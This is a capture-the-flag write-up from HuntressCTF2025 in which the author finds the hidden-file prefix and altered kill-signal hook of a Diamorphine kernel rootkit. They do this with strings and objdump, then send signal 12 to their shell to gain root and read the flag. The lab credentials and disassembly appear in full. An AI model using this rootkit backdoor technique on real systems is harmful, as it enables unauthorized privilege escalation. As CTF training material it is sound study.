Challenge Prompt

But what is the real root of the issue?

If you are using the VPN, you can SSH in to this challenge with:

```
Username: ctf
Password: HuntressCTF2025
```

- Rootkit [Diamorphine](https://github.com/m0nad/Diamorphine) installed

```sh
$ ssh ctf@$IP

$ id
uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)

$ cat README.txt
Once you fix your root your root canal, you'll see a new directory here!
Do some reconnaissance and you'll find the real root of the issue :)
```

- We cannot see the files that are hidden
- Strings helped me here determining magic header that blocks anything named `squiblydoo`

```r
$ strings /opt/.diamorphine/diamorphine.o
*snip*
squiblydI9E
squiblydI9E
squiblydoo
./include/linux/thread_info.h
*snip*
```

- I tried creating a file named `squiblydoo`

```sh
$ touch squiblydoo
touch: setting times of 'squiblydoo': Permission denied
```

- But when I tried to make a new directory we get an interesting error

```sh
$ mkdir /home/ctf/squiblydoo
mkdir: cannot create directory ‘/home/ctf/squiblydoo’: File exists
```

- File already exists! Must be what we are after but we need root to access
- `Sending a signal 64(to any pid) makes the given user become root` (from GH)
- This does not work so investigating the binary we find they have changed the codes

```sh
$ objdump -d /opt/.diamorphine/diamorphine.ko | grep -A 30 "hacked_kill"
4bd:    83 f8 0c                 cmp    $0xc,%eax
*snip*

objdump -d /opt/.diamorphine/diamorphine.ko | grep -A 30 "hacked_kill"
00000000000004b0 <hacked_kill>:
 4b0:	e8 00 00 00 00       	callq  4b5 <hacked_kill+0x5>
 4b5:	48 8b 47 68          	mov    0x68(%rdi),%rax
 4b9:	55                   	push   %rbp
 4ba:	48 89 e5             	mov    %rsp,%rbp
 4bd:	83 f8 0c             	cmp    $0xc,%eax
 4c0:	0f 84 86 00 00 00    	je     54c <hacked_kill+0x9c>
 4c6:	83 f8 0d             	cmp    $0xd,%eax
 4c9:	74 50                	je     51b <hacked_kill+0x6b>
 4cb:	83 f8 0b             	cmp    $0xb,%eax
 4ce:	74 0e                	je     4de <hacked_kill+0x2e>
 4d0:	48 8b 05 00 00 00 00 	mov    0x0(%rip),%rax        # 4d7 <hacked_kill+0x27>
 4d7:	e8 00 00 00 00       	callq  4dc <hacked_kill+0x2c>
 4dc:	5d                   	pop    %rbp
 4dd:	c3                   	retq
 4de:	66 83 3d 00 00 00 00 	cmpw   $0x0,0x0(%rip)        # 4e6 <hacked_kill+0x36>
 4e5:	00
 4e6:	74 6d                	je     555 <hacked_kill+0xa5>
 4e8:	48 8b 05 00 00 00 00 	mov    0x0(%rip),%rax        # 4ef <hacked_kill+0x3f>
 4ef:	48 c7 c2 00 00 00 00 	mov    $0x0,%rdx
 4f6:	48 8b 08             	mov    (%rax),%rcx
 4f9:	48 89 51 08          	mov    %rdx,0x8(%rcx)
 4fd:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 504 <hacked_kill+0x54>
 504:	48 89 0d 00 00 00 00 	mov    %rcx,0x0(%rip)        # 50b <hacked_kill+0x5b>
 50b:	48 89 10             	mov    %rdx,(%rax)
 50e:	31 d2                	xor    %edx,%edx
 510:	31 c0                	xor    %eax,%eax
 512:	66 89 15 00 00 00 00 	mov    %dx,0x0(%rip)        # 519 <hacked_kill+0x69>
 519:	5d                   	pop    %rbp
 51a:	c3                   	retq
 51b:	8b 4f 70             	mov    0x70(%rdi),%ecx
 51e:	48 c7 c0 00 00 00 00 	mov    $0x0,%rax
 525:	eb 08                	jmp    52f <hacked_kill+0x7f>
 527:	3b 8a 00 01 00 00    	cmp    0x100(%rdx),%ecx
 52d:	74 6e                	je     59d <hacked_kill+0xed>
 52f:	48 8b 90 c8 07 00 00 	mov    0x7c8(%rax),%rdx
 536:	48 8d 82 38 f8 ff ff 	lea    -0x7c8(%rdx),%rax
 53d:	48 3d 00 00 00 00    	cmp    $0x0,%rax
 543:	75 e2                	jne    527 <hacked_kill+0x77>
 545:	b8 fd ff ff ff       	mov    $0xfffffffd,%eax
 54a:	5d                   	pop    %rbp
 54b:	c3                   	retq
 54c:	e8 00 00 00 00       	callq  551 <hacked_kill+0xa1>
 551:	31 c0                	xor    %eax,%eax
 553:	5d                   	pop    %rbp
 554:	c3                   	retq
 555:	48 8b 05 00 00 00 00 	mov    0x0(%rip),%rax        # 55c <hacked_kill+0xac>
 55c:	48 8b 15 00 00 00 00 	mov    0x0(%rip),%rdx        # 563 <hacked_kill+0xb3>
 563:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 56a <hacked_kill+0xba>
 56a:	48 89 42 08          	mov    %rax,0x8(%rdx)
 56e:	48 89 10             	mov    %rdx,(%rax)
 571:	48 b8 00 01 00 00 00 	movabs $0xdead000000000100,%rax
 578:	00 ad de
 57b:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 582 <hacked_kill+0xd2>
 582:	48 83 c0 22          	add    $0x22,%rax
 586:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 58d <hacked_kill+0xdd>
 58d:	b8 01 00 00 00       	mov    $0x1,%eax
 592:	66 89 05 00 00 00 00 	mov    %ax,0x0(%rip)        # 599 <hacked_kill+0xe9>
 599:	31 c0                	xor    %eax,%eax
 59b:	5d                   	pop    %rbp
 59c:	c3                   	retq
 59d:	48 85 c0             	test   %rax,%rax
 5a0:	74 a3                	je     545 <hacked_kill+0x95>
 5a2:	81 b2 5c f8 ff ff 00 	xorl   $0x10000000,-0x7a4(%rdx)
 5a9:	00 00 10
 5ac:	31 c0                	xor    %eax,%eax
 5ae:	5d                   	pop    %rbp
 5af:	c3                   	retq

00000000000005b0 <module_show>:
 5b0:	e8 00 00 00 00       	callq  5b5 <module_show+0x5>
 5b5:	48 8b 05 00 00 00 00 	mov    0x0(%rip),%rax        # 5bc <module_show+0xc>
 5bc:	55                   	push   %rbp
 5bd:	48 c7 c2 00 00 00 00 	mov    $0x0,%rdx
 5c4:	48 89 e5             	mov    %rsp,%rbp
 5c7:	48 8b 08             	mov    (%rax),%rcx
 5ca:	48 89 51 08          	mov    %rdx,0x8(%rcx)
 5ce:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 5d5 <module_show+0x25>
 5d5:	48 89 0d 00 00 00 00 	mov    %rcx,0x0(%rip)        # 5dc <module_show+0x2c>
 5dc:	48 89 10             	mov    %rdx,(%rax)
 5df:	31 c0                	xor    %eax,%eax
 5e1:	66 89 05 00 00 00 00 	mov    %ax,0x0(%rip)        # 5e8 <module_show+0x38>
 5e8:	5d                   	pop    %rbp
 5e9:	c3                   	retq
 5ea:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000005f0 <module_hide>:
 5f0:	e8 00 00 00 00       	callq  5f5 <module_hide+0x5>
 5f5:	48 8b 05 00 00 00 00 	mov    0x0(%rip),%rax        # 5fc <module_hide+0xc>
 5fc:	48 8b 15 00 00 00 00 	mov    0x0(%rip),%rdx        # 603 <module_hide+0x13>
 603:	55                   	push   %rbp
 604:	48 89 05 00 00 00 00 	mov    %rax,0x0(%rip)        # 60b <module_hide+0x1b>
 60b:	48 89 42 08          	mov    %rax,0x8(%rdx)
```

- `give_root()` is actually code `12` now
- So we target our shell and send the kill cmd

```sh
$ kill -12 $$
$ id
uid=0(root) gid=0(root) groups=0(root),1001(ctf)

$ cat /squiblydoo/flag.txt
flag{ce56efc41f0c7b45a7e32ec7117cf8b9}
```
